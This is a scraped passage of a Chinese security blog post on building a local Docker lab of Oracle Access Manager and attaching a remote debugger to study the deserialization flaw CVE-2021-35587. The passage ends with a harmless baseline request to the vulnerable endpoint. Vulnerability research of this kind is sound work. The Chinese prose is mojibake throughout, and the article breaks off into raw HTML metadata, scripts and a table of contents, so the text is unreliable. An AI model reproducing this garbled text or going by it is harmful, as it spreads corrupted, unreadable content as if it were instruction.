å¤æ‚åº¦ä¸å¤Ÿï¼Œå¯¼è‡´æ— æ³•è®¾ç½®å¯†ç ã€‚\nå¯åŠ¨å®¹å™¨çš„å‘½ä»¤æ”¹ä¸ºä»¥ä¸‹ã€‚å°†å…¶ä¸­ ADMIN_PASSWORD å’Œ DB_SCHEMA_PASSWORD çš„å¤æ‚åº¦å˜é«˜ã€‚\nå…¶ä¸­ADMIN_PASSWORD åº”è¯¥æ˜¯weblogicç®¡ç†å°çš„å¯†ç ã€‚DB_SCHEMA_PASSWORD æ˜¯ password you want to set for the RCU schemas ã€‚\né‚£ä¹ˆä»€ä¹ˆæ˜¯RCU schemas å‘¢ï¼Ÿä»€ä¹ˆæ˜¯RCUå‘¢ï¼Ÿä¸å¤ªç†è§£ï¼Œå…ˆè·³è¿‡ã€‚\nRepository Creation Utility is a graphical and CLI-based tool used to create and manage Oracle Fusion Middleware database schemas.\næ”¹è¿›ä¸¤ä¸ªå¯†ç çš„å¤æ‚åº¦é‡æ–°åˆ›å»ºå®¹å™¨ã€‚\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Dbsch3m@ -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 å¹¶ä½¿ç”¨ sudo docker logs -ft oamadmin æŸ¥çœ‹æ–°å»ºè¿‡ç¨‹æ‰“å°å‡ºæ¥çš„æ—¥å¿—ï¼Œçœ‹åˆ°é—®é¢˜å¾—åˆ°äº†è§£å†³ã€‚\næŠ¥é”™äº”ï¼šåˆ›å»ºdomainå¤±è´¥ å¯ä»¥çœ‹åˆ°å‰å‡ ä¸ªæ­¥éª¤éƒ½é¡ºåˆ©å®Œæˆäº†ï¼Œä½†ä¹Ÿå‡ºç°äº†æ–°çš„é—®é¢˜ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ç±»ä¼¼å‰æ–‡æ—¥å¿— INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Creating Node Managers... Will create Base domain at /u01/oracle/user_projects/domains/access_domain Writing base domain... Base domain created at /u01/oracle/user_projects/domains/access_domain Extending domain at /u01/oracle/user_projects/domains/access_domain Database 172.17.0.1:1521/ORCLPDB1.localdomain Apply Extension templates Extension Templates added Extension Templates added Deleting oam_server1 The default oam_server1 coming from the oam extension template deleted Deleting oam_policy_mgr1 The default oam_server1 coming from the oam extension template deleted Configuring JDBC Templates ... Configuring the Service Table DataSource... fmwDatabase jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Getting Database Defaults... Error: getDatabaseDefaults() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \"/u01/oracle/dockertools/create_domain.py\", line 513, in ? File \"/u01/oracle/dockertools/create_domain.py\", line 124, in createOAMDomain File \"/u01/oracle/dockertools/create_domain.py\", line 328, in extendOamDomain File \"/u01/oracle/dockertools/create_domain.py\", line 259, in configureJDBCTemplates File \"/tmp/WLSTOfflineIni7074819690261705056.py\", line 267, in getDatabaseDefaults File \"/tmp/WLSTOfflineIni7074819690261705056.py\", line 19, in command Failed to build JDBC Connection object: at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException: Got exception when auto configuring the schema component(s) with data obtained from shadow table: Failed to build JDBC Connection object: Domain Creation Failed.. Please check the Domain Logs è§£å†³äº”ï¼šä¿®æ”¹DB_SCHEMA_PASSWORD ä»æ—¥å¿—çœ‹åˆ°æ˜¯åœ¨ Getting Database Defaults... é˜¶æ®µå‡ºç°çš„é—®é¢˜ï¼Œæœç´¢ getDatabaseDefaults() failed. Do dumpStack() to see details. å‘ç°è¿™ä¸ªgithub issueæœ‰è®¨è®ºã€‚\nçœ‹åˆ°æœ‰äººè¯´æ˜¯ schema password çš„é—®é¢˜ï¼Œäºæ˜¯éšä¾¿æ”¹DB_SCHEMA_PASSWORD ï¼Œæ”¹æˆOradoc_db1 è¿˜æ˜¯ä¸è¡Œï¼Œæ”¹æˆOradoc_db2å°±å¯ä»¥äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ğŸ˜“ä¸è§£\næ€»ä¹‹å‘¢ï¼Œç”¨è¿™ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥è·‘èµ·æ¥ä¸‰ä¸ªå®¹å™¨ä¸­çš„ç¬¬ä¸€ä¸ªäº†ï¼\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 æˆæœ â‘£åˆ›å»ºå®¹å™¨äºŒoamms 1 sudo docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" â‘¤åˆ›å»ºå®¹å™¨ä¸‰oampolicy 1 sudo docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" â‘¥éªŒè¯æœåŠ¡å¯ç”¨æ€§ 1 sudo docker inspect -f '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' oamadmin oamms oampolicy myOracleDB Console or Page URL WebLogic Administration Console http://:7001/console Oracle Enterprise Manager Console http://:7001/em Oracle Access Management Console http://:7001/oamconsole OAM Server Logout http://:14100/oam/server/logout Policy Manager Access http://:15100/access å„æœåŠ¡æˆªå›¾\nâ‘¦å¯åœä¸åˆ é™¤ å¯åœ\n1 2 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker start oamadmin oamms oampolicy myOracleDB åˆ é™¤\n1 2 3 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker rm oamadmin oamms oampolicy myOracleDB sudo rm -rf /scratch/user_projects è¿œç¨‹è°ƒè¯•OAM æœ¬ç« èŠ‚æè¿°äº†æ‹¥æœ‰ä¸€ä¸ªæœ¬åœ°è¿è¡Œçš„OAMä¹‹åå¼€å¯è¿œç¨‹è°ƒè¯•ï¼Œä»¥åŠä»ä»…çŸ¥é“æ¼æ´æ¥å£ï¼Œåˆ°å®šä½æ¼æ´ä¸»æœº/å®¹å™¨ã€å®šä½æ¼æ´è¿›ç¨‹ã€å®šä½æ¼æ´ä»£ç ã€å†åˆ°ä¸‹è½½éƒ¨ç½²åŒ…å’Œæ­å»ºè°ƒè¯•é¡¹ç›®ï¼Œåˆ°æœ€ç»ˆèƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œæ— æºç è¿œç¨‹è°ƒè¯•çš„è¯¦ç»†è¿‡ç¨‹ã€‚å…¶ä¸­ä¹Ÿä½“ç°äº†Java webè¿œç¨‹è°ƒè¯•çš„åŸºæœ¬æµç¨‹å’Œæ€è·¯ã€‚\nå¤§çº² OAMåŒ…æ‹¬å¤šä¸ªå®¹å™¨ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå®šä½å‡ºæ¥åˆ†æè¿™ä¸ªæ¼æ´æ‰€éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹ï¼Œä»¥è°ƒè¯•æ¨¡å¼é‡å¯è¯¥è¿›ç¨‹ï¼Œå°†è°ƒè¯•ç«¯å£ä»å®¹å™¨ä¸­æš´éœ²ç»™ç”¨äºè°ƒè¯•çš„ä¸»æœºï¼Œç„¶åå°†å¯¹åº”è¿›ç¨‹çš„éƒ¨ç½²åŒ…å’Œä¾èµ–åŒ…ä¸‹è½½åˆ°è°ƒè¯•ä¸»æœºï¼Œæœ€åé€šè¿‡ideaè¿›è¡Œå¸¸è§„çš„Java webè¿œç¨‹æ— æºç åŠ¨æ€è°ƒè¯•ã€‚\næ­¥éª¤æ±‡æ€» å‚ç…§ â€é™„å½•ä¸€ï¼šæœ¬åœ°æ­å»ºOAMè¿è¡Œç¯å¢ƒâ€œ çš„ â€æ­¥éª¤æ±‡æ€»â€œ ç« èŠ‚ï¼Œä½†åœ¨ â€æ­¥éª¤æ±‡æ€»â€œ ç« èŠ‚ä¸­çš„ç¬¬7æ­¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ–°å»ºå®¹å™¨ï¼Œåœ¨åŸå‘½ä»¤åŸºç¡€ä¸Šå¢åŠ æš´éœ²å‡ºæ¥å®¹å™¨çš„è°ƒè¯•ç«¯å£ã€‚ 1 2 3 4 docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 8452:8453 -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 -p 8453:8453 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" docker run -d -p 15100:15100 -p 8454:8453 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" ä¿®æ”¹oammså®¹å™¨ä¸­çš„/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh æ–‡ä»¶ï¼Œåœ¨debugFlagå˜é‡è¢«ä½¿ç”¨ä¹‹å‰å°†å…¶èµ‹å€¼ä¸ºtrueã€‚å¤§çº¦æ˜¯åœ¨ç¬¬419è¡Œè¿™ä¸ªç©ºç™½è¡Œæ·»åŠ  debugFlag=\"true\" ã€‚ é‡å¯oammså®¹å™¨ï¼š docker restart oamms å°†oammså®¹å™¨ä¸­çš„ /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/*.jar å’Œ /u01/oracle/coherence/lib/*.jar ä¸‹è½½åˆ°è°ƒè¯•ä¸»æœºï¼Œæ·»åŠ åˆ°è°ƒè¯•é¡¹ç›®çš„libraryä¸­ã€‚ åœ¨oammså®¹å™¨ä¸­ç”Ÿæˆ wlfullclient.jar ï¼Œä¸‹è½½åˆ°è°ƒè¯•ä¸»æœºï¼Œæ·»åŠ åˆ°è°ƒè¯•é¡¹ç›®çš„libraryä¸­ã€‚ é€šè¿‡ docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log æŸ¥çœ‹é”™è¯¯æ—¥å¿— ideaå¯åŠ¨è°ƒè¯• åœ¨ oracle.security.am.pbl.transport.http.AMServlet#doPost ä¸‹æ–­ç‚¹ é€šè¿‡ curl -XPOST http://192.168.175.139:14100/oam/server/opensso/sessionservice å‘é€è¯·æ±‚ è¿™ä¸ªæ—¶å€™ideaå°±èƒ½æˆåŠŸæ•è·åˆ°æ–­ç‚¹äº†ã€‚ â‘ éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹ ç”±æ¼æ´ä½œè€…åˆ†ææ–‡ç« çŸ¥é“å­˜åœ¨æ¼æ´çš„æ¥å£ä¸º /oam/server/opensso/sessionservice ï¼Œç»“åˆOAMæ­å»ºæ–‡æ¡£çš„æœåŠ¡éªŒè¯ç¯èŠ‚ï¼ŒçŸ¥é“æ˜¯oammså®¹å™¨exposeçš„14100ç«¯å£ä¸Šwebåº”ç”¨çš„é—®é¢˜ï¼Œæ•…å°è¯•è°ƒè¯•è¯¥å®¹å™¨çš„webåº”ç”¨ã€‚\nä¿®æ”¹oammså®¹å™¨ä¸­çš„/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh æ–‡ä»¶ä»¥å°†oammsä¸­Javaè¿›ç¨‹åˆ‡æ¢åˆ°å¯è°ƒè¯•æ¨¡å¼ã€‚æ–¹ä¾¿æˆ‘ä»¬é€šè¿‡ideaæŒ‚è½½åˆ°oammsä¸­å¯¹å­˜åœ¨æ¼æ´çš„Javaè¿›ç¨‹è¿›è¡Œè¿œç¨‹è°ƒè¯•ã€‚\nåœ¨ç©ºç™½è¡Œ419è¡Œæ·»åŠ debugFlag=\"true\" ã€‚å®¹å™¨ä¸­æ²¡æœ‰vim , ps , netstat ç­‰å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨ yum install vim net-tools è¿›è¡Œå®‰è£…ã€‚\nç„¶åæ‰§è¡Œdocker restart oammsï¼Œé‡å¯å®Œæˆåè¿›å…¥å®¹å™¨å¯ä»¥çœ‹åˆ°è¿›ç¨‹å·²ç»ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨ï¼Œå¹¶ä¸”ç›‘å¬åœ¨8453ç«¯å£ã€‚\nä½†æ˜¯æ­¤æ—¶oammså®¹å™¨ä¸­çš„8453ç«¯å£å¹¶æ²¡æœ‰exposeå‡ºæ¥ã€‚\nå°è¯•é€šè¿‡å°†å½“å‰oammså®¹å™¨ä¿å­˜ä¸ºé•œåƒï¼Œå†é‡æ–°å¯åŠ¨çš„æ–¹å¼æ¥æ·»åŠ æ˜ å°„ç«¯å£ï¼š\n1 2 3 4 5 6 docker stop oamms docker commit oamms myoamms-image docker container rm oamms docker run -itd -name oamms -p 8453:8453 -p 14100:14100 myoamms-image docker run -itd -n oamms -p 8453:8453 -p 14100:14100 myoamms-image docker run -itd --name oamms -p 8453:8453 -p 14100:14100 myoamms-image ä½†ä¼¼ä¹æ²¡æœ‰æˆåŠŸï¼Œç•Œé¢ä¸€ç›´åœç•™åœ¨ Waiting for WebLogic Admin Server on oamadmin/7001 to become available... ï¼Œå¯èƒ½æ˜¯æ–°å»ºçš„å®¹å™¨IPå˜åŠ¨å¯¼è‡´çš„ç½‘ç»œé€šä¿¡çš„é—®é¢˜ã€‚\nå¹²è„†é‡æ–°éƒ¨ç½²ï¼Œåœ¨æ–°å»ºå„ä¸ªå®¹å™¨çš„æ—¶å€™æ·»åŠ æ˜ å°„ç«¯å£ã€‚\n1 2 3 4 docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 8452:8453 -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 -p 8453:8453 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" docker run -d -p 15100:15100 -p 8454:8453 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" é‡æ–°éƒ¨ç½²åæŒ‰ç…§ä¸Šè¿°ä¿®æ”¹/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh åé‡å¯oammså®¹å™¨ï¼Œå°†oammsæ”¹æˆè°ƒè¯•æ¨¡å¼å¯åŠ¨ã€‚\nâ‘¡ç›‘æ§webåº”ç”¨æ—¥å¿— ä»docker logs -f oamms å¯ä»¥çœ‹åˆ°oammsçš„webåº”ç”¨æ—¥å¿—åœ¨/u01/oracle/user_projects/domains/access_domain/logs/è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œè®¿é—®åº”ç”¨æ—¶æœ€æ–°å‡ºç°æ”¹å˜çš„æ–‡ä»¶æ˜¯oam_server1-ms-oamms.logã€‚\nå› æ­¤æ‰§è¡Œ\n1 docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log â‘¢å‘æ¼æ´æ¥å£å‘é€åŸºæœ¬è¯·æ±‚ å‚è€ƒæ¼æ´ä½œè€…åˆ†ææ–‡ç«  ï¼Œå‘OAMMSå‘é€ä¸€ä¸ª /oam/server/opensso/sessionservice æ‰€èƒ½æ¥å—å’Œå¤„ç†çš„åŸºæœ¬è¯·æ±‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /oam/server/opensso/sessionservice HTTP/1.1 Host: 192.168.175.139:14100 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close Accept-Language: zh-CN,zh;q=0.9 Content-Type: text/xml Content-Length: 294 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e \u003cRequestSet vers=\"vers123\" svcid=\"session\" reqid=\"req_1\"\u003e \u003cRequest dtdid=\"dtd1\" sid=\"sid1\"\u003e\u003c![CDATA[ 123 ]]\u003e \u003c/Request\u003e \u003c/RequestSet\u003e çœ‹åˆ°æ—¥å¿—ä¸­çš„æŠ¥é”™è°ƒç”¨æ ˆä¸º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 ","wordCount":"9647","inLanguage":"en","datePublished":"2022-07-14T19:40:55+08:00","dateModified":"2022-07-14T19:40:55+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/"},"publisher":{"@type":"Organization","name":"é—²è¨€è¯­","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="é—²è¨€è¯­ (Alt + H)">é—²è¨€è¯­</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=éšç¬”><span>éšç¬”</span></a></li><li><a href=https://ret2neo.cn/about title=å…³äº><span>å…³äº</span></a></li><li><a href=https://ret2neo.cn/search title="æœç´¢ (Alt + /)" accesskey=/><span>æœç´¢</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>CVE-2021-35587ï¼šOracle Access Managerååºåˆ—åŒ–æ¼æ´</h1><div class=post-meta><span title='2022-07-14 19:40:55 +0800 +0800'>July 14, 2022</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/230515-oracle-access-manager-cve-2021-35587.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>ç›®å½•</span></summary><div class=inner><ul><li><a href=#%e6%bc%8f%e6%b4%9e%e6%a6%82%e5%86%b5 aria-label=æ¼æ´æ¦‚å†µ>æ¼æ´æ¦‚å†µ</a></li><li><a href=#%e6%9c%ac%e5%9c%b0%e6%90%ad%e5%bb%baoam aria-label=æœ¬åœ°æ­å»ºOAM>æœ¬åœ°æ­å»ºOAM</a><ul><li><a href=#%e5%a4%a7%e7%ba%b2 aria-label=å¤§çº²>å¤§çº²</a></li><li><a href=#%e6%ad%a5%e9%aa%a4%e6%b1%87%e6%80%bb aria-label=æ­¥éª¤æ±‡æ€»>æ­¥éª¤æ±‡æ€»</a></li><li><a href=#%e8%bf%90%e8%a1%8coracle%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label=â‘ è¿è¡ŒOracleæ•°æ®åº“>â‘ è¿è¡ŒOracleæ•°æ®åº“</a><ul><li><a href=#%e5%88%9b%e5%bb%baoracle%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label=åˆ›å»ºOracleæ•°æ®åº“>åˆ›å»ºOracleæ•°æ®åº“</a></li><li><a href=#%e6%b5%8b%e8%af%95%e6%95%b0%e6%8d%ae%e5%ba%93%e8%bf%9e%e6%8e%a5 aria-label=æµ‹è¯•æ•°æ®åº“è¿æ¥>æµ‹è¯•æ•°æ®åº“è¿æ¥</a><ul><li><a href=#%e5%ae%89%e8%a3%85sqlplus aria-label=å®‰è£…sqlplus>å®‰è£…sqlplus</a><ul><li><a href=#step1 aria-label=step1:>step1:</a></li><li><a href=#step2 aria-label=step2:>step2:</a></li><li><a href=#step3 aria-label=step3:>step3:</a></li><li><a href=#step4 aria-label=step4:>step4:</a></li><li><a href=#step5 aria-label=step5:>step5:</a></li><li><a href=#step6 aria-label=step6:>step6:</a></li><li><a href=#step7-%e6%b5%8b%e8%af%95%e9%93%be%e6%8e%a5 aria-label="step7 æµ‹è¯•é“¾æ¥">step7 æµ‹è¯•é“¾æ¥</a></li><li><a href=#%e5%85%b6%e4%bb%96sqlplus64%e7%9a%84%e7%94%a8%e6%b3%95 aria-label=å…¶ä»–ï¼šsqlplus64çš„ç”¨æ³•>å…¶ä»–ï¼šsqlplus64çš„ç”¨æ³•</a></li></ul></li></ul></li></ul></li><li><a href=#%e4%b8%8b%e8%bd%bdoam%e9%95%9c%e5%83%8f aria-label=â‘¡ä¸‹è½½OAMé•œåƒ>â‘¡ä¸‹è½½OAMé•œåƒ</a></li><li><a href=#%e5%88%9b%e5%bb%ba%e5%ae%b9%e5%99%a8%e4%b8%80oamadmin aria-label=â‘¢åˆ›å»ºå®¹å™¨ä¸€oamadmin>â‘¢åˆ›å»ºå®¹å™¨ä¸€oamadmin</a><ul><li><a href=#%e6%8a%a5%e9%94%99%e5%8f%8a%e8%a7%a3%e5%86%b3 aria-label=æŠ¥é”™åŠè§£å†³>æŠ¥é”™åŠè§£å†³</a><ul><li><a href=#%e6%8a%a5%e9%94%99%e4%b8%80%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label=æŠ¥é”™ä¸€ï¼šæ— æ³•è¿æ¥æ•°æ®åº“>æŠ¥é”™ä¸€ï¼šæ— æ³•è¿æ¥æ•°æ®åº“</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%b8%80%e4%bd%bf%e7%94%a8%e6%ad%a3%e7%a1%ae%e7%9a%84ip aria-label=è§£å†³ä¸€ï¼šä½¿ç”¨æ­£ç¡®çš„IP>è§£å†³ä¸€ï¼šä½¿ç”¨æ­£ç¡®çš„IP</a></li><li><a href=#%e6%8a%a5%e9%94%99%e4%ba%8c%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5cdb aria-label=æŠ¥é”™äºŒï¼šæ— æ³•è¿æ¥CDB>æŠ¥é”™äºŒï¼šæ— æ³•è¿æ¥CDB</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%ba%8c%e4%bd%bf%e7%94%a8pdb aria-label=è§£å†³äºŒï¼šä½¿ç”¨PDB>è§£å†³äºŒï¼šä½¿ç”¨PDB</a></li><li><a href=#%e6%8a%a5%e9%94%99%e4%b8%89%e6%97%a0%e6%b3%95%e6%89%a7%e8%a1%8csql aria-label=æŠ¥é”™ä¸‰ï¼šæ— æ³•æ‰§è¡ŒSQL>æŠ¥é”™ä¸‰ï¼šæ— æ³•æ‰§è¡ŒSQL</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%b8%89%e6%89%93%e5%bc%80pdb aria-label=è§£å†³ä¸‰ï¼šæ‰“å¼€PDB>è§£å†³ä¸‰ï¼šæ‰“å¼€PDB</a></li><li><a href=#%e6%8a%a5%e9%94%99%e5%9b%9b%e5%88%9b%e5%bb%badomain%e5%a4%b1%e8%b4%a5 aria-label=æŠ¥é”™å››ï¼šåˆ›å»ºdomainå¤±è´¥>æŠ¥é”™å››ï¼šåˆ›å»ºdomainå¤±è´¥</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e5%9b%9b%e6%8f%90%e9%ab%98admin_password-%e5%af%86%e7%a0%81%e5%a4%8d%e6%9d%82%e5%ba%a6 aria-label="è§£å†³å››ï¼šæé«˜ADMIN_PASSWORD å¯†ç å¤æ‚åº¦">è§£å†³å››ï¼šæé«˜<code>ADMIN_PASSWORD</code> å¯†ç å¤æ‚åº¦</a></li><li><a href=#%e6%8a%a5%e9%94%99%e4%ba%94%e5%88%9b%e5%bb%badomain%e5%a4%b1%e8%b4%a5 aria-label=æŠ¥é”™äº”ï¼šåˆ›å»ºdomainå¤±è´¥>æŠ¥é”™äº”ï¼šåˆ›å»ºdomainå¤±è´¥</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%ba%94%e4%bf%ae%e6%94%b9db_schema_password 